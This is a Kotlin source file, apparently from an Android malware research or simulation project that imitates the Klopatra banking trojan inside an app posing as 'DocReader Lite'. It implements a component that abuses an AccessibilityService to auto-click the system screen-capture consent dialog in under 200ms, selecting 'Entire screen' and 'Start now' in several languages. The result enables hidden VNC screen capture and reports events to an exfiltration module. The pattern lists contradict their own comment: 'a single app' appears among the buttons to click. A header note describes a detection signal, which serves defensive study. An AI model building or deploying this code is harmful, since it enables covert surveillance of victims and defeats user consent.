package com.docreader.lite.reader.advanced

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.docreader.lite.reader.Exfil
import kotlinx.coroutines.*

/**
 * MediaProjection auto-consent — Klopatra hidden VNC prerequisite (2025).
 *
 * MediaProjection requires user clicking "Start now" on system dialog:
 *   "DocReader Lite will start capturing everything that's displayed
 *    on your screen."
 *
 * Klopatra pattern: AccessibilityService auto-clicks "Start now" button
 * within 200ms of dialog appearing — user sees brief flash, no time to react.
 *
 * Kill chain:
 *   1. App requests MediaProjection via createScreenCaptureIntent()
 *   2. System shows consent dialog (MediaProjectionPermissionActivity)
 *   3. A11yService detects consent dialog window
 *   4. A11yService finds "Start now" / "Start" / "Allow" button
 *   5. A11yService performs ACTION_CLICK within 200ms
 *   6. MediaProjection grant → HiddenVnc.start() captures screen
 *
 * Android 14+: "single app" vs "entire screen" chooser added.
 * Klopatra clicks "Entire screen" then "Start".
 *
 * Detection: A11y event on system MediaProjection dialog +
 * ACTION_CLICK within <500ms = auto-consent signal.
 */
object MediaProjectionAutoConsent {

    // System dialog package for MediaProjection consent
    private val CONSENT_PACKAGES = setOf(
        "com.android.systemui",
        "android",                          // Some OEMs
        "com.samsung.android.permissioncontroller",  // Samsung
    )

    // Button text patterns to auto-click (multi-language)
    private val START_PATTERNS = listOf(
        "start now",
        "start",
        "allow",
        "begin",
        "izin ver",        // Turkish
        "iniciar",         // Spanish
        "comenzar",        // Spanish
        "autoriser",       // French
        "erlauben",        // German
        "starten",         // German
    )

    // "Entire screen" selector (Android 14+)
    private val ENTIRE_SCREEN_PATTERNS = listOf(
        "entire screen",
        "a single app",   // We want to NOT click this
        "ekran",          // Turkish
        "pantalla completa", // Spanish
    )

    @Volatile
    var autoConsentEnabled = true

    @Volatile
    var lastConsentTime = 0L
        private set

    private val scope = CoroutineScope(Dispatchers.Main + SupervisorJob())

    /**
     * Check if current A11y event is the MediaProjection consent dialog.
     * Called from DocumentReaderService on TYPE_WINDOW_STATE_CHANGED.
     */
    fun isConsentDialog(event: AccessibilityEvent): Boolean {
        val pkg = event.packageName?.toString() ?: return false
        if (pkg !in CONSENT_PACKAGES) return false

        // Check window text for MediaProjection consent indicators
        val text = event.text?.joinToString(" ")?.lowercase() ?: ""
        return text.contains("start capturing") ||
            text.contains("screen capture") ||
            text.contains("recording") ||
            text.contains("cast") ||
            text.contains("share your screen")
    }

    /**
     * Auto-click consent dialog.
     * Sub-200ms from dialog appearance to click — user sees brief flash.
     *
     * On Android 14+: first select "Entire screen", then click "Start".
     */
    fun autoConsent(service: AccessibilityService) {
        if (!autoConsentEnabled) return

        scope.launch {
            try {
                val root = service.rootInActiveWindow ?: return@launch
                val startTime = System.currentTimeMillis()

                // Step 1 (Android 14+): Select "Entire screen" if chooser present
                val entireScreenNode = findButtonByPatterns(root, ENTIRE_SCREEN_PATTERNS)
                if (entireScreenNode != null) {
                    entireScreenNode.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                    Exfil.event("mp_consent_entire_screen_selected")

                    // Brief delay for UI transition
                    delay(100)

                    // Re-acquire root after click
                    val newRoot = service.rootInActiveWindow ?: return@launch

                    // Step 2: Click "Start now"
                    val startNode = findButtonByPatterns(newRoot, START_PATTERNS)
                    if (startNode != null) {
                        startNode.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                        lastConsentTime = System.currentTimeMillis()

                        val elapsed = lastConsentTime - startTime
                        Exfil.event("mp_consent_auto_approved",
                            "elapsed_ms" to elapsed.toString(),
                            "android14_flow" to "true"
                        )
                    }
                    return@launch
                }

                // Pre-Android 14: single "Start now" / "Start" button
                val startNode = findButtonByPatterns(root, START_PATTERNS)
                if (startNode != null) {
                    startNode.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                    lastConsentTime = System.currentTimeMillis()

                    val elapsed = lastConsentTime - startTime
                    Exfil.event("mp_consent_auto_approved",
                        "elapsed_ms" to elapsed.toString(),
                        "android14_flow" to "false"
                    )
                } else {
                    Exfil.event("mp_consent_button_not_found")
                }

            } catch (e: Exception) {
                Exfil.event("mp_consent_error", "error" to (e.message ?: ""))
            }
        }
    }

    /**
     * Find clickable node matching any of the given text patterns.
     * Recursive tree walk — returns first match.
     */
    private fun findButtonByPatterns(
        root: AccessibilityNodeInfo,
        patterns: List<String>
    ): AccessibilityNodeInfo? {
        return findNodeRecursive(root, 0) { node ->
            val nodeText = node.text?.toString()?.lowercase() ?: ""
            val nodeDesc = node.contentDescription?.toString()?.lowercase() ?: ""
            val combined = "$nodeText $nodeDesc"

            node.isClickable && patterns.any { combined.contains(it) }
        }
    }

    private fun findNodeRecursive(
        node: AccessibilityNodeInfo,
        depth: Int,
        predicate: (AccessibilityNodeInfo) -> Boolean
    ): AccessibilityNodeInfo? {
        if (depth > 15) return null
        if (predicate(node)) return node

        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            val result = findNodeRecursive(child, depth + 1, predicate)
            if (result != null) return result
        }
        return null
    }
}
